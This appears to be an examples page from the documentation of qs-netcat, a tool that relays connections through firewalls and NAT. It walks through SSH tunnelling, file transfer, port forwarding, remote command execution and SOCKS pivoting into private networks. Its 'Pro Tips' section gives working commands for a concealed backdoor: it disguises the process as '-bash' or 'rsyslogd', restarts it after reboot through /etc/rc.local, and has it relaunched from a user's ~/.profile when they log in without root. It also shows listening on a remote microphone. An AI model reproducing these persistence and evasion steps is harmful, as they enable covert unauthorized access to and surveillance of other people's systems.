---
title: 'Examples'
toc: false
---

# Examples

---

<video width="760" height="500" controls>
  <source src="https://user-images.githubusercontent.com/17179401/221196823-5c6e3a66-3b06-410a-9d2b-33efd101428a.mp4" type="video/mp4">
</video> 

<details>
<summary>RDP connection over QSRN</summary>

<video width="760" height="500" controls>
  <source src="https://github.com/qsocket/qs-netcat/assets/17179401/af46c8fb-cb33-483a-b5c1-9142843da2bd" type="video/mp4">
</video>
</details>

<details>
<summary>ADB access over QSRN</summary>

<video width="760" height="500" controls>
  <source src="https://user-images.githubusercontent.com/17179401/216651601-6ddc8ddf-7248-4c2b-bd77-00f00f773c80.mov" type="video/mp4">
</video>
</details>

**Usage:**

- SSH from *Workstation B* to *Workstation A* through any firewall/NAT
```
$ qs-netcat -f "localhost:22" -l  # Workstation A
$ qsocket ssh root@qsocket        # Workstation B
```
- Log in to Workstation A from Workstation B through any firewall/NAT
```
$ qs-netcat -l -i   # Workstation A
$ qs-netcat -i      # Workstation B
```

- Transfer files from *Workstation B* to *Workstation A*
```
$ qs-netcat -q -s MySecret -l > file.txt     # Workstation A
$ qs-netcat -q -s MySecret < file.txt        # Workstation B
```

- Port forward. Access 192.168.6.7:22 on Workstation's A private LAN from Workstation B:
```
$ qs-netcat -l -f 192.168.6.7:22    # Workstation A
$ qs-netcat -f :2222                # Workstation B
```

- In a new terminal on Workstation B execute:
```
ssh -p 2222 root@127.0.0.1        # Will ssh to 192.168.6.7:22 on Workstation's A private LAN
```

- Execute any command (nc -e style) on *Workstation A*
```
$ qs-netcat -l -e "echo hello world; id; exit"   # Workstation A
$ qs-netcat                                      # Workstation B
```

Another example: Spawn a new docker environment deep inside a private network
```
# Start this on a host deep inside a private network
qs-netcat -il -e "docker run --rm -it kalilinux/kali-rolling"
```

Access the docker environment deep inside the private network from anywhere in the world:
```
qs-netcat -i
```
Listen in on a remote computer microphone for 10 seconds
```
$ qs-mic -l -s MySecret           # Workstation A
$ qs-mic -d 10 -s MySecret --play # Workstation B
```
Access entirety of Workstation A's private LAN (Sock4/4a/5 proxy)
```
$ qs-netcat -l -f :22 -s MySecret                                        # Workstation A
$ ssh -D 9090 -o ProxyCommand='qs-netcat -s MySecret' root@doesnotmatter # Workstation B

Access www.google.com via Workstation A's private LAN from your Workstation B:
$ curl --socks4a 127.1:9090 http://www.google.com
```

Mount a remove folder using sshfs and qs-netcat
```
$ qs-netcat -l -f :22 -s MySecret # Workstation A
$ qs-netcat -f :9090 -s MySecret  # Workstation B
$ sudo sshfs -o allow_other,default_permissions -p 9090 root@localhost:/remote_dir /mnt/local_dir # Workstation B
```

**Pro Tips**
- Hide your arguments (argv)

Pass the arguments by environment variable (QS_ARGS) and use a bash-trick to hide qs-netcat binary in the process list:
```
$ export QS_ARGS="-s MySecret -l -i -q"
$ exec -a -bash ./qs-netcat &     # Hide as '-bash'.
$ ps alxww | grep qs-netcat

$ ps alxww | grep -bash
  1001 47255     1   0  26  5  4281168    436 -      SNs    ??    0:00.00 -bash
```

- SSH login to remote workstation
```
# On the remote workstation execute:
qs-netcat -s MySecret -l -f 192.168.6.7:22
```
or
```
# Access 192.168.6.7 via ssh on the remote network from your workstation:
ssh -o ProxyCommand='qs-netcat -s MySecret' root@doesnotmatter
```

- Retain access after reboot
The easiest way to retain access to a remote system is by using [the automated deploy script](https://github.com/qsocket/qs-deploy). Alternatively the following can be used to achieve the same:
Combine what you have learned so far and make your backdoor restart after reboot (and as a hidden service obfuscated as *rsyslogd*). Use any of the start-up scripts, such as */etc/rc.local*:
```
$ cat /etc/rc.local
#! /bin/sh -e

QS_ARGS="-s MySecret -l -i -q" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd $HOME; exec -a rsyslogd /usr/local/bin/qs-netcat"

exit 0
```
Not all environment variables are set during system bootup. Set some variables to make the backdoor more enjoyable: *TERM=xterm-256color* and *SHELL=/bin/bash* and *HOME=/root*. The startup script (*/etc/rc.local*) uses */bin/sh* which does not support our *exec -a* trick. Thus we use */bin/sh* to start */bin/bash* which in turn does the *exec -a* trick and starts *qs-netcat*. Puh. The qs-netcat process is hidden (as *rsyslogd*) from the process list. Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.  

Alternatively install qs-netcat as a [systemd service](examples/systemd-root-shell).

Alternativly and if you do not have root privileges then just append the following line to the user's *~/.profile* file. This will start qs-netcat (if it is not already running) the next time the user logs in. There are [many other ways to restart a reverse shell after system reboot](https://www.qsocket.io/deploy):
```
killall -0 qs-netcat 2>/dev/null || (QS_ARGS="-s MySecret -l -i -q" SHELL=/bin/bash exec -a -bash /usr/local/bin/qs-netcat)
```
